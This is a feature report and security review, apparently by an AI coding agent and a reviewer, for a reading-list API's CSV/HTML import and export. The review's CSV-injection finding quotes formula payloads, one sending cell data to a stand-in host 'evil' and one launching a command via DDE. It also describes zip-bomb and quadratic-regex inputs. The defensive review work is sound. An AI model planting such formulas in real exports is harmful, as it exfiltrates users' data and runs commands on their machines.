# io (feat/import-export)

## Report
Branch `feat/import-export` is committed as `511a6dc`, and it has not been run on a real Workflows runtime. `npm run typecheck` passes for all workspaces. The 24 new tests in `workers/api/test/import/` pass, as does the rest of the api suite. `sync-fuzz` timed out once during the full run, then passed when run alone.

**What was built**
- **Parsers** (`workers/api/src/import/`): my own CSV and bookmark-HTML scanners (not linkedom) for `pocket_csv`, `pocket_html`, `instapaper_csv` and `netscape_html`.
  - Pocket CSV also reads a 2025 `.zip` of CSVs and an optional `favorite` column, so our own export re-imports.
  - Tags split on `|`, or on commas if there is no `|`. Timestamps are seconds, or ms if clearly ms.
  - Rows without a usable http(s) URL count as skipped. Rows are sorted newest first, and a file over 50,000 rows fails the job.
- **`POST /v1/imports`**:
  - Checks the 415, 413, 400 and 429 cases. The 429 is a limit of 10 imports per day. That limit is my addition, not requested.
  - Stores the upload at `uploads/{userId}/{importId}.{csv|html|zip}`, inserts the D1 job row, then starts the workflow.
  - Returns 202 with the Job. If the workflow can't start, the job is marked failed and the route returns 503. `GET /v1/imports/:id` returns the Job only to its owner.
- **`ImportWorkflow`** (`IMPORT_WORKFLOW`, `src/import/workflow.ts`):
  - The `parse` step writes batches of 200 rows (each with a pre-assigned itemId) to R2, because step output is limited to 1 MiB.
  - Each `apply-N` step calls `applyOps("import", item.add …)` with `onDuplicate: "merge"` and `source: "import"`. Op ids are `{importId}:{row}`, so step retries are idempotent. The same step enqueues the returned parse jobs newest first.
  - A separate `progress-N` step writes absolute `done` and `skipped` values to D1. `step.sleep("3 seconds")` runs between batches.
  - `finish` marks the job done and deletes the upload and row chunks. Parse errors fail the job with a code such as `missing_url_column`.
- **`GET /v1/exports?format=csv|json`**: a streamed attachment, newest first, defaulting to json. CSV columns are `title,url,time_added,tags,status,favorite`, with RFC 4180 quoting. JSON is the `ExportJson` shape.
- **Wiring**: `Env.IMPORT_WORKFLOW`, `export { ImportWorkflow }` in `src/index.ts`, and a `workflows` block in `wrangler.jsonc`.

**What the tests cover**
- Realistic fixtures for all four formats, the zip case, and the export round trip through the importer.
- Route checks for 415, 400, 413, 404 for another user's job, and 503.
- An end-to-end run of the workflow body against the real `LibraryDO`, D1 and R2, using a fake step and a fake queue. It checks parse-job order, progress counts, batching of 450 rows into 200/200/50 with two sleeps, replay idempotency, re-import, and failure.

**Remaining issues**
- The `ImportWorkflow` class and the `workflows` binding have not run on a real Workflows runtime. Tests drive `runImport` directly with a fake step and a stub binding. A `wrangler deploy --dry-run` couldn't run because `apps/web/dist` isn't built.
- If `applyOps` succeeds but the step fails before the queue send, the retry replays the ops and returns no parse jobs. Those items are left to the `LibraryDO` stuck-pending sweep. This is the same behaviour as the sync push path.
- A large import takes about 3 s × batches. 50,000 rows is 250 batches, roughly 12 minutes, using about 750 steps per instance.
- `docs/api.md` §11.1 still says imports are processed in `ctx.waitUntil` with the upload at `uploads/{userId}/{jobId}`. It should be updated to the Workflow design and the extensioned key.

## Review
I found 6 real defects and 2 low-severity notes. None is a hard blocker for a single-user happy path. #1–#3 are the ones to fix before deploying.

**1. Medium (security): CSV/formula injection in the export**
- **Where:** `workers/api/src/routes/exports.ts:11-22` (`csvRow`), via `csvField` in `workers/api/src/import/csv.ts:48-50`.
- **Problem:** Cells are only RFC-4180 quoted. Titles mostly come from saved web pages, which an attacker controls, and tags are user text. A page titled `=HYPERLINK("http://evil/?"&A1,"x")` or `=cmd|' /c calc'!A1` lands as a live formula when the user opens the CSV in Excel or Sheets.
- **Fix:** In `csvRow`, for the title and tags cells, prefix `'` to any value starting with `=`, `+`, `-`, `@`, `\t` or `\r`. Have the Pocket CSV importer strip a leading `'` that is followed by one of those characters, so the round trip still works.

**2. Medium (data/privacy): a running import is not stopped when the account is deleted**
- **Where:** `workers/api/src/routes/account.ts:72,93-97` together with `workers/api/src/import/workflow.ts:67-91`.
- **Problem:** `DELETE /account` deletes the `jobs` rows and the `uploads/{userId}/` prefix (async, in `waitUntil`), and wipes the `LibraryDO`. It never terminates the `ImportWorkflow` instances. An `apply-N` step that runs after the DO wipe but before the R2 prefix delete finishes calls `getByName(userId).applyOps(...)`. That recreates DO storage (items, tags) for a deleted user and enqueues parse jobs for them. `updateJob` then silently writes to rows that no longer exist.
- **Fix:**
  - In account deletion, select the user's `queued` and `running` import jobs before deleting them, and call `env.IMPORT_WORKFLOW.get(id).terminate()` on each (ignore not-found).
  - Also add a guard at the start of each `apply-N`: if the job row is gone, stop and do nothing.

**3. Medium (data retention): the upload and row chunks are never deleted when an import fails**
- **Where:** `workers/api/src/import/workflow.ts:59-62` (the `fail` step) and `:105-112` (`fail-unexpected`).
- **Problem:** Only `finish` deletes `uploadKey` and the `rows-*.json` chunks. Parse errors (`missing_url_column`, `too_many_rows`, `bad_zip`) and unexpected failures leave the user's full reading-list export in R2 indefinitely. No lifecycle rule in `wrangler.jsonc` cleans it up.
- **Fix:**
  - In both fail steps, delete the upload and any chunks: list the prefix `uploads/{userId}/{importId}/` plus `uploadKey`.
  - Alternatively, add an R2 lifecycle rule on `uploads/` that expires objects after about 7 days.

**4. Medium (resource limit / DoS): zip decompression has no size cap**
- **Where:** `workers/api/src/import/parsers.ts:112-125` (`unzipSync` with only a name filter).
- **Problem:** The 20 MiB limit applies to the compressed upload. A small zip bomb (or many large CSV entries) inflates far past the 128 MB isolate memory before the 50,000-row check at `:215` runs. The `parse` step then OOMs and is retried with the default retries (5). That burns CPU and memory per attempt, up to 10 times a day per user.
- **Fix:** In the `unzipSync` `filter`, reject entries when `f.originalSize` is above a cap, keep a running total (for example 50 MiB), and throw `ImportParseError("zip_too_large")`. Also cap the number of entries.

**5. Medium (correctness at scale): the export is not really streamed and can exceed the DO RPC limit**
- **Where:** `workers/api/src/routes/exports.ts:47` and `workers/api/src/library-do.ts:243-246`.
- **Problem:**
  - `exportItems()` returns every live item, signed, in one RPC reply. The `ReadableStream` only slices an array that is already fully in memory.
  - At the import limit of 50,000 items, the Item objects carry `excerpt`, `siteName`, signed thumbnail URLs and so on, at roughly 0.7–1 KB each. That can pass the 32 MiB Workers RPC payload limit, or put real pressure on memory, and the export returns 500.
  - Signing image URLs is wasted work, since the export drops them.
- **Fix:**
  - Add a paginated `exportPage(cursor, limit)` on `LibraryDO` that returns unsigned rows ordered `saved_at DESC, id`.
  - Have `pull()` in the stream fetch one page per call.

**6. Low (resource): quadratic regex scan on malformed bookmark HTML**
- **Where:** `workers/api/src/import/html.ts:39`.
- **Problem:** The lazy patterns `<a\b([^>]*)>([\s\S]*?)<\/a\s*>` and `<(h[1-6])...>([\s\S]*?)<\/\1>` scan to the end of the document for every unclosed `<a`/`<hN>`. A 20 MiB file made of `<a>` repeated is O(n²), so the `parse` step spins until it times out, and is retried 5 times.
- **Fix:** Use a linear tokenizer: find the next `<a`, then use `indexOf("</a", pos)` with a bound, and stop at the next `<a`/`<dt` if no closer comes first. Or cap the anchor text length (for example `[\s\S]{0,4096}?`).

**Low-severity notes**
- **Rate limit** (`workers/api/src/routes/imports.ts:42-45`): the 10-per-day count includes jobs that failed with `workflow_unavailable` (the 503 path), so platform outages use up the user's quota. Count-then-insert is also not atomic, so concurrent posts can go past 10. Fix: exclude `error = 'workflow_unavailable'` from the count. An exact cap would need a conditional insert.
- **Tag round trip** (`workers/api/src/routes/exports.ts:16` with `workers/api/src/import/parsers.ts:56-58`): the export joins tags with `|`, and the importer splits on `,` when the cell has no `|`. `normalizeTagName` allows both characters, so one tag such as `a,b` re-imports as two tags, and a tag containing `|` is split as well. Fix: either reject `|` and `,` in tag names, or always split our own export's `tags` column on `|` only.

**Checked and found correct**
- Step replay is idempotent: ops are deduplicated on `(IMPORT_DEVICE_ID, "{importId}:{row}")`, which is at most 42 characters, within the 64 limit. `itemId`s are fixed inside the `parse` step output, and progress is written as absolute values.
- Batch size 200 is within `maxOpsPerPush` (500).
- `GET /v1/imports/:id` is scoped to the owner via `user_id`.
- The JSON export's comma and bracket handling, including an empty library, is correct.
- The 503 path cleans up correctly.
